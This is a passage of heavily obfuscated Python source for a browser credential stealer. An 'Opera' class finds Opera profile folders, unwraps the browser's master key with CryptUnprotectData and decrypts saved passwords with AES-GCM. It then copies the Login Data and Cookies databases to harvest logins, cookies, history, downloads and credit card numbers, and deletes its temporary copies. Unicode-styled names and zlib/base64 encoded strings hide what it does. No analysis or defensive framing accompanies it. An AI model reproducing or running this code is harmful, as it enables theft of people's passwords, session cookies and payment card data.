𝘳𝗮𝘯𝘨𝙚(1)), __𝗶𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝗰𝙖𝗿𝙙_𝗻𝘶𝘮𝗯𝗲𝗿 = 𝘴𝙚𝘭𝗳.decrypt_password(𝗿𝘰𝘄[𝙞𝙣𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 395 - (𝗶𝙣𝘵(𝙊) + 𝗶), 𝘮𝗮𝗽(__𝘪𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝘵𝘦𝘳(__𝙞𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xad\xca\xae\x04\x00\x03\xf5\x01\xac')).decode())] * 3)), 𝘳𝗮𝗻𝙜𝘦(1)), __𝗶𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙨𝙚𝙡𝙛.master_key)
            __𝘊𝘼𝗥𝘿𝗦__.append(𝗧𝘆𝘱𝘦𝘀.CreditCard(𝘳𝗼𝘸[𝘪𝗻𝘁.from_bytes(𝗺𝗮𝘱(lambda O, i: 442 - (𝘪𝘯𝘁(𝗢) + 𝙞), 𝗺𝙖𝗽(__𝘪𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝙞𝘁𝙚𝘳(__𝘪𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝘯𝘨𝙚(0)), __𝘪𝘮𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝙤𝙬[𝗶𝗻𝙩.from_bytes(𝙢𝙖𝘱(lambda O, i: 440 - (𝗶𝗻𝘵(𝙊) + 𝙞), 𝙢𝙖𝘱(__𝗶𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝗶𝙩𝘦𝘳(__𝙞𝗺𝘱𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3s\xf15\x05\x00\x02\xd7\x01\x15')).decode())] * 3)), 𝗿𝙖𝘯𝘨𝙚(1)), __𝙞𝙢𝗽𝙤𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗿𝙤𝘄[𝙞𝘯𝘁.from_bytes(𝗺𝘢𝙥(lambda O, i: 510 - (𝙞𝘯𝙩(𝗢) + 𝘪), 𝗺𝗮𝗽(__𝙞𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝗽(*[𝘪𝘵𝘦𝗿(__𝙞𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝘮𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\x0bq4\x01\x00\x02\xee\x01\x18')).decode())] * 3)), 𝗿𝗮𝘯𝗴𝗲(1)), __𝙞𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝙢𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝗰𝘢𝘳𝙙_𝙣𝘶𝗺𝘣𝗲𝙧, 𝗿𝗼𝘸[𝗶𝘯𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 832 - (𝘪𝙣𝘁(𝙊) + 𝗶), 𝘮𝗮𝗽(__𝙞𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝗶𝘁𝘦𝙧(__𝗶𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3w\xf14\x01\x00\x02\xd2\x01\x11')).decode())] * 3)), 𝗿𝙖𝙣𝙜𝙚(1)), __𝙞𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]))
        𝗰𝙤𝗻𝘯.close()
        𝙤𝙨.remove(__𝘪𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8b4r\xab\x8c\xf2\xf0K\x8br\xf7\xb4\x05\x00\x19\x01\x03\xc8')).decode())

class Opera:

    def __init__(self):
        𝘀𝘦𝘵𝘢𝘁𝙩𝙧(𝙨𝙚𝙡𝘧, 'roaming', 𝗼𝘀.getenv(__𝙞𝗺𝗽𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x0b\x0cs\n\x0cru\x0b\r\x0c\xb4\xb5\x05\x00\x17\xa5\x03\x89')).decode()))
        𝘴𝘦𝙩𝗮𝙩𝙩𝗿(𝘴𝙚𝘭𝙛, 'paths', {__𝙞𝗺𝗽𝙤𝘳𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xdaK2v\xcaI\xceu\xcbKu\xb4\xb5\x05\x00\x1a \x03\xe8')).decode(): 𝙨𝘦𝘭𝙛.roaming + __𝙞𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\xb5,\x8f\x8a\xf0\xca\xf0t\xf3+\x8b\xca\x0b2\x8e\x8c\xf0\xca\x89\x80\x89\xb9\xa6D\x02\xc5\r"\xc3\xbd\x8a\xa3\x02mm\x01H\x08\x0eT')).decode(), __𝗶𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK2v\xcaI\xceu\xb5\x05\x00\x0b\xbf\x02\x96')).decode(): 𝘀𝘦𝙡𝗳.roaming + __𝘪𝘮𝙥𝙤𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\xb5,\x8f\x8a\xf0\xca\xf0t\xf3+\x8b\xca\x0b2\x8e\x8c\xf0\xca\x89@\x88\x19D\x86{\x15G\x05\xda\xda\x02\x00\x0f\xc8\r\t')).decode()})
        for (_, 𝙥𝗮𝘵𝗵) in 𝘀𝙚𝙡𝘧.paths.items():
            if not 𝙤𝘀.path.exists(𝗽𝘢𝘁𝗵):
                continue
            𝙨𝘦𝘁𝗮𝙩𝙩𝙧(𝘀𝗲𝗹𝗳, 'master_key', 𝘴𝘦𝙡𝙛.get_master_key(__𝙞𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xcc\x8a\x0c/O\x0f5\x0e\xcaHq\x0f\xb5\x05\x00C*\x06x')).decode().format(𝘱𝙖𝙩𝙝)))
            if not 𝘴𝗲𝙡𝘧.master_key:
                continue
            𝘰𝘱𝙚𝙧𝙖𝘁𝘪𝘰𝙣𝘴 = [𝘀𝗲𝗹𝗳.get_login_data, 𝙨𝙚𝙡𝘧.get_cookies, 𝘴𝘦𝘭𝗳.get_web_history, 𝙨𝗲𝗹𝙛.get_downloads, 𝘴𝙚𝗹𝘧.get_credit_cards]
            for 𝘰𝘱𝘦𝗿𝗮𝘵𝗶𝙤𝗻 in 𝘰𝙥𝙚𝘳𝗮𝘁𝙞𝗼𝗻𝙨:
                try:
                    𝘰𝗽𝗲𝙧𝘢𝘵𝘪𝗼𝙣(𝘱𝗮𝘵𝘩)
                except 𝙀𝘅𝗰𝗲𝙥𝘁𝗶𝙤𝗻 as e:
                    pass

    def get_master_key(self, path):
        if not 𝗼𝘴.path.exists(𝙥𝘢𝙩𝙝):
            return
        if __𝗶𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode() not in 𝘰𝙥𝙚𝗻(𝙥𝘢𝙩𝙝, __𝙞𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝙞𝙢𝗽𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).read():
            return
        with 𝙤𝘱𝗲𝘯(𝘱𝙖𝙩𝙝, __𝗶𝙢𝙥𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode(), encoding=__𝗶𝙢𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
            𝘤 = 𝙛.read()
        𝗹𝗼𝗰𝘢𝘭_𝙨𝙩𝗮𝙩𝙚 = 𝗷𝘀𝗼𝙣.loads(𝗰)
        𝙢𝘢𝘴𝙩𝙚𝙧_𝘬𝙚𝙮 = 𝙗𝗮𝙨𝙚64.b64decode(𝙡𝘰𝙘𝗮𝗹_𝘴𝙩𝘢𝘵𝘦[__𝗶𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝙞𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaK2\xf6K\x8b4\xf62M\xf6\x08\xb4\x05\x00\x17\xac\x03\x8e')).decode()][__𝙞𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8b\n7\xcdJ\xce\xcb)Oq\x0f\xcb\x8e0*\xc9I\r\xb4\xb5\x05\x00K\xf6\x07\x0b')).decode()])
        𝙢𝘢𝘴𝙩𝘦𝙧_𝗸𝘦𝘺 = 𝙢𝗮𝘀𝘵𝘦𝙧_𝙠𝘦𝘆[𝙞𝘯𝘵.from_bytes(𝗺𝘢𝘱(lambda O, i: 562 - (𝙞𝗻𝘁(𝘖) + 𝗶), 𝗺𝗮𝙥(__𝘪𝗺𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝙥(*[𝗶𝙩𝙚𝘳(__𝘪𝗺𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\xf3\x0b\t5\x06\x00\x03\x15\x01+')).decode())] * 3)), 𝙧𝗮𝘯𝘨𝙚(1)), __𝗶𝗺𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝘮𝙖𝙨𝘵𝗲𝗿_𝙠𝙚𝙮 = 𝘊𝘳𝘺𝗽𝙩𝘜𝙣𝙥𝙧𝙤𝙩𝘦𝘤𝘵𝘿𝙖𝘵𝗮(𝘮𝙖𝘀𝘵𝙚𝙧_𝗸𝗲𝙮, None, None, None, 𝙞𝗻𝘁.from_bytes(𝙢𝘢𝙥(lambda O, i: 498 - (𝙞𝗻𝘵(𝙊) + 𝙞), 𝙢𝘢𝗽(__𝗶𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝗶𝘵𝗲𝙧(__𝘪𝗺𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝘢𝘯𝙜𝗲(0)), __𝘪𝙢𝘱𝙤𝙧𝘵__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))[𝗶𝙣𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 461 - (𝙞𝗻𝙩(𝘖) + 𝘪), 𝙢𝙖𝙥(__𝙞𝙢𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝗽(*[𝗶𝘁𝘦𝗿(__𝙞𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3s\x89,\x07\x00\x031\x01c')).decode())] * 3)), 𝙧𝗮𝙣𝗴𝘦(1)), __𝙞𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        return 𝘮𝙖𝘴𝙩𝙚𝙧_𝗸𝗲𝙮

    def decrypt_password(self, buff, master_key):
        𝘪𝘃 = 𝗯𝙪𝘧𝘧[𝘪𝗻𝙩.from_bytes(𝘮𝙖𝗽(lambda O, i: 862 - (𝗶𝘯𝘵(𝘖) + 𝘪), 𝗺𝙖𝙥(__𝙞𝙢𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝗶𝙩𝙚𝗿(__𝙞𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝗺𝙥𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3w\t5\x05\x00\x02\xeb\x01\x1e')).decode())] * 3)), 𝘳𝘢𝗻𝘨𝗲(1)), __𝘪𝘮𝙥𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):𝘪𝙣𝘵.from_bytes(𝘮𝙖𝘱(lambda O, i: 722 - (𝘪𝗻𝘵(𝙊) + 𝗶), 𝘮𝙖𝘱(__𝘪𝗺𝘱𝗼𝗿𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝘪𝘁𝘦𝘳(__𝘪𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝗶𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf3\xabr4\x06\x00\x03_\x01=')).decode())] * 3)), 𝗿𝙖𝙣𝙜𝙚(1)), __𝘪𝘮𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]
        𝙥𝗮𝘆𝗹𝗼𝘢𝘥 = 𝗯𝘶𝙛𝘧[𝗶𝗻𝙩.from_bytes(𝙢𝗮𝘱(lambda O, i: 732 - (𝙞𝗻𝘵(𝙊) + 𝙞), 𝗺𝘢𝘱(__𝘪𝗺𝘱𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝗶𝘁𝗲𝙧(__𝗶𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xabr5\x06\x00\x03g\x01A')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝗲(1)), __𝙞𝗺𝙥𝗼𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):]
        𝘤𝗶𝙥𝘩𝙚𝗿 = 𝗔𝘌𝙎.new(𝙢𝘢𝙨𝘁𝗲𝗿_𝘬𝘦𝘺, 𝘈𝗘𝙎.MODE_GCM, 𝗶𝙫)
        𝙙𝗲𝙘𝗿𝘆𝙥𝘁𝙚𝗱_𝘱𝗮𝘴𝙨 = 𝙘𝘪𝘱𝗵𝗲𝗿.decrypt(𝘱𝗮𝘺𝗹𝗼𝗮𝘥)
        𝗱𝘦𝙘𝘳𝘆𝘱𝘵𝗲𝙙_𝘱𝙖𝘀𝘀 = 𝗱𝗲𝘤𝗿𝘆𝗽𝙩𝙚𝙙_𝗽𝘢𝘀𝘀[:-𝗶𝗻𝘵.from_bytes(𝘮𝗮𝘱(lambda O, i: 899 - (𝘪𝙣𝘁(𝙊) + 𝘪), 𝗺𝘢𝗽(__𝘪𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝘱(*[𝘪𝙩𝙚𝗿(__𝗶𝘮𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝙢𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3wI\xaf\x02\x00\x03T\x01u')).decode())] * 3)), 𝙧𝙖𝗻𝘨𝘦(1)), __𝗶𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].decode()
        return 𝙙𝙚𝘤𝗿𝙮𝘱𝘵𝘦𝙙_𝗽𝙖𝙨𝘴

    def get_login_data(self, path):
        𝙡𝗼𝙜𝘪𝗻_𝘥𝗯 = __𝘪𝗺𝘱𝙤𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK56L\x0eq\xb7\xccK\x0c7I\x0frw3\x88\x0c\xb4\xb5\x05\x00?\xf6\x05\xf5')).decode().format(𝗽𝙖𝘁𝙝)
        if not 𝗼𝙨.path.exists(𝙡𝗼𝘨𝙞𝙣_𝙙𝙗):
            return
        𝘴𝙝𝙪𝘵𝘪𝘭.copy(𝗹𝘰𝗴𝙞𝘯_𝙙𝗯, __𝘪𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝗰𝙤𝘯𝙣 = 𝙨𝙦𝗹𝙞𝙩𝘦3.connect(__𝘪𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝗶𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())
        𝙘𝙪𝗿𝘀𝙤𝗿 = 𝙘𝘰𝙣𝙣.cursor()
        𝗰𝙪𝗿𝘴𝙤𝙧.execute(__𝙞𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x0b5\x08\xf3\r\n\xf5\x0b\xf5t\xb7\xacL\x0cO)H\xca\xb14L\xce-/\xf6\xf4\x08\xab\x8a\x8a\xf0*\x8d\x0c7\xcc\x890\x8e\xcaH\xf2\x08\xcb\xf1qv*\x8f\x8c\xf0\xabJ1\xb2\xac\x8cr\xb34\x8a\x0c\xaf0\x8c\nvr\x0f\xcd\xb6\xf4\xf3t\xaf(\x8b2\xca)M.\xb7\xb5\x05\x00\xb0\n\x1c4')).decode())
        for 𝙧𝙤𝘸 in 𝗰𝙪𝙧𝘴𝙤𝘳.fetchall():
            if not 𝙧𝙤𝙬[𝙞𝘯𝘁.from_bytes(𝙢𝘢𝙥(lambda O, i: 301 - (𝗶𝗻𝙩(𝘖) + 𝘪), 𝘮𝗮𝘱(__𝘪𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝘪𝘁𝘦𝗿(__𝗶𝗺𝘱𝗼𝘳𝘵__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝘢𝘯𝙜𝘦(0)), __𝙞𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or not 𝗿𝗼𝙬[𝗶𝘯𝘁.from_bytes(𝘮𝗮𝙥(lambda O, i: 861 - (𝗶𝘯𝘁(𝙊) + 𝗶), 𝘮𝘢𝙥(__𝙞𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝘱(*[𝙞𝘁𝘦𝘳(__𝙞𝙢𝙥𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3w\x89,\x07\x00\x035\x01d')).decode())] * 3)), 𝘳𝙖𝘯𝗴𝙚(1)), __𝘪𝗺𝙥𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] or (not 𝙧𝙤𝘄[𝗶𝙣𝘵.from_bytes(𝘮𝘢𝙥(lambda O, i: 916 - (𝘪𝙣𝘵(𝘖) + 𝘪), 𝗺𝘢𝘱(__𝗶𝙢𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝗺𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝗽(*[𝙞𝘵𝗲𝗿(__𝗶𝘮𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3\x0fq5\x00\x00\x02\xf6\x01\x19')).decode())] * 3)), 𝗿𝗮𝙣𝗴𝙚(1)), __𝙞𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]):
                continue
            𝙥𝘢𝘀𝘀𝙬𝙤𝙧𝙙 = 𝘀𝗲𝗹𝘧.decrypt_password(𝗿𝗼𝘸[𝘪𝗻𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 637 - (𝘪𝘯𝘵(𝙊) + 𝙞), 𝘮𝗮𝗽(__𝙞𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝙞𝙩𝗲𝙧(__𝘪𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝗺𝙥𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xcb\xf25\x04\x00\x03E\x017')).decode())] * 3)), 𝗿𝙖𝗻𝙜𝘦(1)), __𝙞𝙢𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘴𝗲𝙡𝘧.master_key)
            __𝘓𝘖𝘎𝗜𝘕𝙎__.append(𝗧𝘺𝗽𝘦𝘴.Login(𝙧𝗼𝙬[𝘪𝙣𝘁.from_bytes(𝗺𝘢𝘱(lambda O, i: 798 - (𝗶𝘯𝙩(𝙊) + 𝗶), 𝘮𝘢𝗽(__𝙞𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝘪𝘁𝗲𝙧(__𝙞𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝙖𝘯𝙜𝗲(0)), __𝙞𝙢𝘱𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝘳𝙤𝘸[𝙞𝗻𝙩.from_bytes(𝘮𝙖𝘱(lambda O, i: 408 - (𝙞𝙣𝘵(𝗢) + 𝘪), 𝙢𝘢𝘱(__𝘪𝗺𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝙥(*[𝗶𝙩𝗲𝙧(__𝘪𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3sq4\x06\x00\x02\xbd\x01\x07')).decode())] * 3)), 𝗿𝘢𝗻𝘨𝘦(1)), __𝗶𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)], 𝙥𝙖𝙨𝘀𝙬𝗼𝗿𝙙))
        𝗰𝘶𝘳𝘀𝘰𝘳.close()
        𝙘𝗼𝘯𝘯.close()
        𝘰𝙨.remove(__𝘪𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xb7\xccK\x0c7M\x8br\xf7\xb4\x05\x00\x19z\x03\xcb')).decode())

    def get_cookies(self, path):
        𝗰𝙤𝘰𝘬𝘪𝗲𝘴_𝘥𝘣 = __𝗶𝙢𝗽𝗼𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK56L\x0e\xc9\r3H1\xb2\xacL4\xacpI2\xb2,J\x0c\x0f\xab\x02\x00^6\x07\xd1')).decode().format(𝘱𝘢𝙩𝙝)
        if not 𝙤𝘀.path.exists(𝘤𝙤𝘰𝗸𝘪𝙚𝘀_𝘥𝙗):
            return
        𝙨𝘩𝘂𝙩𝘪𝘭.copy(𝙘𝙤𝗼𝙠𝗶𝘦𝙨_𝙙𝙗, __𝙞𝙢𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x8b4\xb2,K4\xca\xc9I6\xb4\xcc\x8eL\xb7\xb5\x05\x00+\x8c\x05\x18')).decode())
